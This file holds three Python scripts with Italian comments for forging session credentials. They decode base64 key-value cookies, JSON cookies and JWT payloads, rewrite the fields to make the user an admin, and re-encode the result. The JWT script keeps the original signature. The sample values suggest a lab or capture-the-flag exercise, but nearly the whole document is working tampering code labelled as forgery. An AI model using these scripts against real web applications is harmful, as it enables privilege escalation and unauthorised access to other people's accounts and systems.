#!/usr/bin/env python3
import base64

COOKIE_ORIGINALE = "dXNlcj1hbGljZTtyb2xlPXVzZXI="  # decodificato: user=alice;role=user

def patch_key_value(cookie_b64: str, updates: dict, sep: str = ";") -> str:
    # 1. Decodifica
    raw_str = base64.b64decode(cookie_b64).decode('utf-8')
    
    # 2. Parsing della stringa in dizionario
    pairs = [item.strip() for item in raw_str.split(sep) if "=" in item]
    data = dict(pair.split("=", 1) for pair in pairs)
    
    # 3. Aggiornamento selettivo dei campi
    data.update(updates)
    
    # 4. Ricostruzione e codifica
    new_str = sep.join(f"{k}={v}" for k, v in data.items())
    return base64.b64encode(new_str.encode('utf-8')).decode('utf-8')

# Esempio d'uso:
modifiche = {"user": "admin", "role": "admin"}
cookie_forgiato = patch_key_value(COOKIE_ORIGINALE, modifiche)

print("--- CASO 1: KEY-VALUE ---")
print(f"Cookie Forgiato: {cookie_forgiato}")


#!/usr/bin/env python3
import base64
import json

COOKIE_ORIGINALE = "eyJ1c2VyIjogIkFsaWNlIiwgImFkbWluIjogZmFsc2V9"  # decodificato: {"user": "Alice", "admin": false}

def patch_json(cookie_b64: str, updates: dict) -> str:
    # 1. Decodifica
    raw_str = base64.b64decode(cookie_b64).decode('utf-8')
    
    # 2. Parsing JSON
    data = json.loads(raw_str)
    
    # 3. Aggiornamento dei campi mantenendo i tipi di dato (es. booleani)
    data.update(updates)
    
    # 4. Ricostruzione JSON e codifica Base64
    new_str = json.dumps(data)
    return base64.b64encode(new_str.encode('utf-8')).decode('utf-8')

# Esempio d'uso:
modifiche = {"user": "admin", "admin": True}
cookie_forgiato = patch_json(COOKIE_ORIGINALE, modifiche)

print("--- CASO 2: JSON ---")
print(f"Cookie Forgiato: {cookie_forgiato}")


#!/usr/bin/env python3
import base64
import json

# Esempio JWT (Header.Payload.Signature)
JWT_ORIGINALE = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiQWxpY2UiLCJhZG1pbiI6ZmFsc2V9.signature_hash"

def pad_base64(b64_str: str) -> str:
    """Aggiunge il padding '=' se mancante (tipico dei JWT base64url)."""
    return b64_str + "=" * (-len(b64_str) % 4)

def patch_jwt_payload(jwt_token: str, updates: dict) -> str:
    parts = jwt_token.split(".")
    if len(parts) != 3:
        raise ValueError("Formato token non valido: non è un JWT a tre sezioni.")
    
    header_b64, payload_b64, signature = parts
    
    # 1. Decodifica del solo Payload (seconda sezione)
    decoded_payload = base64.urlsafe_b64decode(pad_base64(payload_b64)).decode('utf-8')
    data = json.loads(decoded_payload)
    
    # 2. Aggiornamento dati
    data.update(updates)
    
    # 3. Ricodifica del Payload modificato
    new_payload_json = json.dumps(data)
    new_payload_b64 = base64.urlsafe_b64encode(new_payload_json.encode('utf-8')).decode('utf-8').rstrip("=")
    
    # 4. Ricomposizione del token (N.B. Se il server verifica la firma, la firma originale sara' non valida)
    return f"{header_b64}.{new_payload_b64}.{signature}"

# Esempio d'uso:
modifiche = {"user": "admin", "admin": True}
jwt_forgiato = patch_jwt_payload(JWT_ORIGINALE, modifiche)

print("--- CASO 3: JWT ---")
print(f"JWT Forgiato: {jwt_forgiato}")
